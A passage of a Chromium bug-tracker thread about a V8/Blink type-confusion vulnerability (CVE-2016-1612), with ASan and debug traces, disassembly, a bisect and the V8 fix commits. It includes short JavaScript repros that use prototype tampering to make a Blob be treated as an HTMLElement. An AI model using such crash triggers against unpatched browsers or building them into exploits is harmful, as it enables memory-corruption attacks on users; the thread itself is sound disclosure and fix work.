    #42 0x555d4209157e in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:32:21
    #43 0x555d420deefe in base::RunLoop::Run() base/run_loop.cc:55:3
    #44 0x555d42080b48 in base::MessageLoop::Run() base/message_loop/message_loop.cc:288:3
    #45 0x555d516fba3c in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer_main.cc:211:7
    #46 0x555d41ef6614 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate*) content/app/content_main_runner.cc:302:14
    #47 0x555d41ef7ef4 in content::RunNamedProcessTypeMain(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate*) content/app/content_main_runner.cc:386:12
    #48 0x555d41ef9f1a in content::ContentMainRunnerImpl::Run() content/app/content_main_runner.cc:804:12
    #49 0x555d41ef52fb in content::ContentMain(content::ContentMainParams const&) content/app/content_main.cc:19:15
    #50 0x555d40b8a5cf in ChromeMain chrome/app/chrome_main.cc:66:12
    #51 0x7f3d38d0fa3f in __libc_start_main /build/buildd/glibc-2.21/csu/libc-start.c:289

AddressSanitizer can not describe address in more detail (wild memory access suspected).
SUMMARY: AddressSanitizer: use-after-poison third_party/WebKit/Source/wtf/RawPtr.h:118:36 in operator*
Shadow bytes around the buggy address:
  0x0fe04e1a82e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe04e1a82f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe04e1a8300: 00 00 00 00 00 f7 00 00 00 00 f7 00 00 00 00 00
  0x0fe04e1a8310: 00 00 f7 00 00 00 00 f7 00 00 00 00 00 00 00 f7
  0x0fe04e1a8320: 00 00 00 00 00 f7 00 00 00 00 00 f7 00 00 00 00
=>0x0fe04e1a8330: 00 f7 00 00 00 00 00[f7]f7 f7 f7 f7 f7 f7 f7 f7
  0x0fe04e1a8340: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x0fe04e1a8350: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x0fe04e1a8360: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x0fe04e1a8370: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x0fe04e1a8380: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==9520==ABORTING



### ha...@chromium.org (2015-11-18)

dominicc: Would you triage this in the DOM team?


### cl...@chromium.org (2015-12-09)

dominicc@: Uh oh! This issue is still open and hasn't been updated in the last 21 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### do...@chromium.org (2015-12-14)

[Empty comment from Monorail migration]

### do...@chromium.org (2015-12-14)

I get an "Uncaught TypeError: Illegal Invocation" on line 14 of the original repro and the ClusterFuzz report in https://crbug.com/chromium/497632#c1, which may be blocking this case.

However the repro in https://crbug.com/chromium/497632#c19 hits this assertion at r364779, which looks useful:

ASSERTION FAILED: m_treeScope
../../third_party/WebKit/Source/core/dom/Node.h(469) : blink::TreeScope &blink::Node::treeScope() const
1   0x3bb0b59
2   0x3bb00c5
3   0x4369b3f
4   0x4030193
5   0x4027454
6   0x210fcc40dc8
Received signal 11 SEGV_MAPERR 0000fbadbeef
#0 0x00000068b2ce base::debug::StackTrace::StackTrace()
#1 0x00000068ae0f base::debug::(anonymous namespace)::StackDumpSignalHandler()
#2 0x7fd0decaa340 <unknown>
#3 0x000003bb0b60 blink::Node::treeScope()
#4 0x000003bb00c5 blink::Node::document()
#5 0x000004369b3f blink::Element::offsetHeight()
#6 0x000004030193 blink::HTMLElementV8Internal::offsetHeightAttributeGetter()
#7 0x000004027454 blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback()
#8 0x0210fcc40dc8 <unknown>
  r8: 00007fd0e742ca00  r9: 0000000000000001 r10: 00007fd0de53ebe0 r11: 0000000000000000
 r12: 00000000beeddead r13: 00001ad8b386a0d8 r14: 00001ad8b3a220f8 r15: 00001ad8b386ba68
  di: 0000000000000000  si: 00000000fbadbeef  bp: 00007ffc013f2670  bx: 00001ad8b3a220f8
  dx: 0000000000000000  ax: b25f93bca59d4c00  cx: 00000000fbadbeef  sp: 00007ffc013f2660
  ip: 0000000003bb0b60 efl: 0000000000010246 cgf: 0000000000000033 erf: 0000000000000006
 trp: 000000000000000e msk: 0000000000000000 cr2: 00000000fbadbeef
[end of stack trace]


### do...@chromium.org (2015-12-14)

Here is a hand-minimized variant which triggers the same *assertion* (don't know about the crash:)

<script>                                                                                                                    
blobHtml=new Blob([undefined], {'type': 'text/html'});                                                                      
elementForm=document.createElement('form');                                                                                 
blobHtml.__proto__.__proto__ = elementForm;                                                                                 
blobWav=new Blob([undefined], {'type': 'audio/x-wav'});                                                                     
elementInput=document.createElement('input');                                                                               
elementInput.__proto__=blobWav.__proto__;                                                                                   
o = [blobWav, elementInput, blobWav, blobWav];                                                                              
for(var x=0;x<4;x++) {                                                                                                      
  try{o[x].offsetHeight}catch(a){}                                                                                          
}                                                                                                                           
</script>

That the array access seems integral to this is interesting. I wonder if a cache is getting confused because of the mixed-up prototypes, and hence the forth blobWav is treated like a Node (which would be... bad!)

Fun stuff. Timed out for today, will continue to work on this first thing.

### do...@chromium.org (2015-12-15)

Here is a slightly more minimized repro. This one uses a function, not an array (so maybe having one callsite is important) and one fewer blob instance.

### do...@chromium.org (2015-12-15)

To reiterate, here's the repro I'm using:

<script>
blob = new Blob();
elementForm = document.createElement('form');
blob.__proto__.__proto__ = elementForm;

elementDiv = document.createElement('div');
elementDiv.__proto__ = blob.__proto__;

f(blob);
f(elementDiv);
f(blob);
f(blob); // *

function f(p) {
  try { p.offsetHeight; } catch (a) {}
}
</script>

There is definitely type punning happening here; on the line marked * a Blob* is being cast to HTMLElement*. You can pun different types of objects, for example Range also works. inferno, would that justify raising the severity?

Something may be special about nodes as the target type though; I was not successful trying to use MouseEvent/WheelEvent which are kind of analogous to different kinds of nodes as target types. Maybe it is about the state the prototypes are in when (ab)used or bindings features like NewObject, PerWorldBindings that createElement has.

My working hypothesis is that at the call site, a cache is confused by the wonky prototypes and slips and lets the wrong type through on that final invocation.

Unfortunately I have hit my limit of V8 disassembly debugging at this point, or how V8 guarantees type safety for property accessors in the first place. (The generated bindings don't, they seem to just static_cast a ScriptWrappable in this--and many--cases.)

Here's the disassembly of some of what is "up", of course I'm guessing at start offsets here though and nothing looks too exciting: 
                                                                  
   0x00003243d7f3f501:  mov    %rsp,-0x8(%rbp)                                                                              
   0x00003243d7f3f505:  mov    %rbx,(%rsp)                                                                                  
   0x00003243d7f3f509:  add    $0x30,%rbx                                                                                   
   0x00003243d7f3f50d:  mov    %rbx,0x8(%rsp)                                                                               
   0x00003243d7f3f512:  movq   $0x0,0x10(%rsp)                                                                              
   0x00003243d7f3f51b:  movq   $0x0,0x18(%rsp)                                                                              
   0x00003243d7f3f524:  lea    (%rsp),%rdi                                                                                  
   0x00003243d7f3f528:  movabs $0x305a2a16aa68,%r15                                                                         
   0x00003243d7f3f532:  mov    (%r15),%r14                                                                                  
   0x00003243d7f3f535:  mov    0x8(%r15),%rbx                                                                               
   0x00003243d7f3f539:  addl   $0x1,0x10(%r15)                                                                              
   0x00003243d7f3f53e:  movabs $0x305a2a0f9601,%rax                                                                         
   0x00003243d7f3f548:  cmpb   $0x0,(%rax)                                                                                  
   0x00003243d7f3f54b:  je     0x3243d7f3f563                                                                               
   0x00003243d7f3f551:  mov    %rdx,%rsi                                                                                    
   0x00003243d7f3f554:  movabs $0x7fdebb090370,%rax                                                                         
   0x00003243d7f3f55e:  jmpq   0x3243d7f3f566                                                                               
   0x00003243d7f3f563:  mov    %rdx,%rax                                                                                    
   0x00003243d7f3f566:  callq  *%rax                                                                                        
=> 0x00003243d7f3f568:  mov    0x28(%rbp),%rax                                                                              
   0x00003243d7f3f56c:  subl   $0x1,0x10(%r15)                                                                              
   0x00003243d7f3f571:  mov    %r14,(%r15)                                                                                  
   0x00003243d7f3f574:  cmp    0x8(%r15),%rbx                                                                               
   0x00003243d7f3f578:  jne    0x3243d7f3f62c                                                                               
   0x00003243d7f3f57e:  mov    0x40(%rbp),%rsi                                                                              
   0x00003243d7f3f582:  mov    %rbp,%rsp                                                                                    
   0x00003243d7f3f585:  pop    %rbp

and callq *%rax is arriving at 0x00007fdeb7985910 which is blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback; FWIW 0x7fdebb090370 is v8::internal::InvokeFunctionCallback.

### ad...@chromium.org (2015-12-15)

+epertoso, jochen for bindings expertise

### do...@chromium.org (2015-12-15)

I bisected this to here:

https://chromium.googlesource.com/chromium/src/+log/93545626c7ebd5eabedfdbb0a3a77455a3cd3f8b..facdd420f530f4f4bb9f18fae8f0d1c3efdcc9f3

Note that this does not include a V8 roll (although it could still be a latent V8 issue.) Here is the Blink changelog:

https://chromium.googlesource.com/chromium/blink/+log/0ee3fcb..8f8d2bb

Perhaps this was caused by:

https://chromium.googlesource.com/chromium/blink/+/d90fa7c5f4b83a3325b72fed61e8a1af4b0f8c41

### in...@chromium.org (2015-12-15)

Raising severity based on c#26 (looks like bad cast issue which is high severity).

### cl...@chromium.org (2015-12-15)

You have far exceeded the 60-day deadline for fixing this high severity security vulnerability.

We commit ourselves to this deadline and appreciate your utmost priority on this issue.

If you are unable to look into this soon, please find someone else to own this.

- Your friendly ClusterFuzz

### do...@chromium.org (2015-12-17)

jochen, can you find someone in Munich familiar with V8's "holder" machinery to look into this?

TL;DR:
1. Run the repro in step 25. It crashes.
2. Look at it in the debugger. Set a breakpoint in blink::Blob::Blob and note the address of "this".
3. On the crash stack, notice that the Blob instance is being unwrapped in blink::HTMLElement::offsetHeightAttributeGetterCallback. So someone set us up the bomb.

Working hypothesis: Something has confused or bypassed V8's holder checking machinery.

In the (good|bad) old days--depends on your perspective--the callback's holder was always? safe to use because all of the property accessors were defined on instances and there was that idea of hidden prototypes to boot.

Now the property accessors are on prototypes. In this case, we have two objects running around with interesting prototypes:

A: Blob instance -> Blob prototype -> FORM element instance -> ...
B: DIV element instance -> Blob prototype -> FORM element instance -> ...

And the added, necessary complication is there's one call site that sees four calls to the HTMLElement.offsetHeight property, with receivers A, B, A, A. The first three are OK (TypeError, gets a value, TypeError); the fourth one crashes.

(Is there any possibility that the fourth call has a problem serializing the callstack and continues to the call site or anything weird like that?)

### jo...@chromium.org (2015-12-17)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-12-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/cfbd16172fa165cc33ce0e2e72f74e5561168a61

commit cfbd16172fa165cc33ce0e2e72f74e5561168a61
Author: jkummerow <jkummerow@chromium.org>
Date: Thu Dec 17 12:28:23 2015

[IC] Fix "compatible receiver" checks hidden behind interceptors

BUG=chromium:497632
LOG=y

Review URL: https://codereview.chromium.org/1531583005

Cr-Commit-Position: refs/heads/master@{#32945}

[modify] http://crrev.com/cfbd16172fa165cc33ce0e2e72f74e5561168a61/src/ic/ic.cc


### jk...@chromium.org (2015-12-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-17)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### do...@chromium.org (2015-12-18)

My reduction no longer crashes. Yay! Thanks, jkummerow!

### ha...@google.com (2016-01-08)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/75846095d2b36b47a7e68117d629ba7f9c7fd05c

commit 75846095d2b36b47a7e68117d629ba7f9c7fd05c
Author: Michael Hablich <hablich@chromium.org>
Date: Fri Jan 08 09:28:35 2016

Version 4.8.271.14 (cherry-pick)

Merged cfbd16172fa165cc33ce0e2e72f74e5561168a61

[IC] Fix "compatible receiver" checks hidden behind interceptors

BUG=chromium:497632
LOG=N
R=jkummerow@chromium.org

Review URL: https://codereview.chromium.org/1570083002 .

Cr-Commit-Position: refs/branch-heads/4.8@{#17}
Cr-Branched-From: 10449d46aa20f10f39598627bf07f70def597029-refs/heads/4.8.271@{#1}
Cr-Branched-From: 2ebd5fc7c934ec0a07c3ef0958b7fee35fa2e974-refs/heads/master@{#31941}

[modify] http://crrev.com/75846095d2b36b47a7e68117d629ba7f9c7fd05c/include/v8-version.h
[modify] http://crrev.com/75846095d2b36b47a7e68117d629ba7f9c7fd05c/src/ic/ic.cc


### bu...@chromium.org (2016-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/84ffeddd7c32c221231ff22e025fef8a32e0d1fc

commit 84ffeddd7c32c221231ff22e025fef8a32e0d1fc
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Fri Jan 08 09:57:02 2016

Version 4.7.80.29 (cherry-pick)

Merged cfbd16172fa165cc33ce0e2e72f74e5561168a61

[IC] Fix "compatible receiver" checks hidden behind interceptors

BUG=chromium:497632
LOG=N
R=hablich@chromium.org

Review URL: https://codereview.chromium.org/1568233002 .

Cr-Commit-Position: refs/branch-heads/4.7@{#40}
Cr-Branched-From: f3c89267db0fc6120d95046c3ff35a35ca34614f-refs/heads/master@{#31014}

[modify] http://crrev.com/84ffeddd7c32c221231ff22e025fef8a32e0d1fc/include/v8-version.h
[modify] http://crrev.com/84ffeddd7c32c221231ff22e025fef8a32e0d1fc/src/ic/ic.cc


### ti...@google.com (2016-01-11)

[Empty comment from Monorail migration]

### ti...@google.com (2016-01-11)

[Empty comment from Monorail migration]

### ti...@google.com (2016-01-20)

Congrats - $3000 for this report. We'll put in the next payment run.

### ti...@google.com (2016-01-20)

[Empty comment from Monorail migration]

### ti...@google.com (2016-01-20)

CVE-2016-1612

### ti...@google.com (2016-03-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-03-24)

This security bug has been closed for more than 14 weeks. Removing view restrictions.

For more details visit https://sites.google.com/a/chromium.org/dev/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/497632?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082241)*
